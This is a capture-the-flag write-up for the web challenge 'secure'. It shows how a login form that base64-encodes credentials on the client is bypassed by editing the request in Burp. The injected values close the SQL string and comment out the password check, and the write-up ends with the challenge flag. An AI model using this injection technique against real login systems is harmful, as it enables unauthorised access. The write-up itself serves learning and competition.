# web/secure
### BrownieInMotion

## Description
Just learned about encryption—now, my website is unhackable!

secure.mc.ax

[index.js](Assets\index.js)

## Solution
We use Burp to intercept requests<br/>
When logging in with username `admin` and password `qwerty`, we see that a POST request is sent to `/login`, with the parameters: `username=YWRtaW4%3D&password=cXdlcnR5`<br/>
Essentially, it is sending base64 encoded text from the username and password field<br/>
We are also greeted with an error, which tells us the SQL statement that had been run:
```sql
SELECT id FROM users WHERE username = 'YWRtaW4=' AND password = 'cXdlcnR5';
```

We are able to intercept and change the request through Burp<br/>
We also see that we can use SQL injection to comment out a part of the query, by setting username as `YWRtaW4='/*`, and password as `*/; -- `<br/>
This causes the following SQL statement to be run<br/>
```sql
SELECT id FROM users WHERE username = 'YWRtaW4='/*' AND password = '*/; -- ';
```

Intercepting and editing the request, we get the flag

> flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}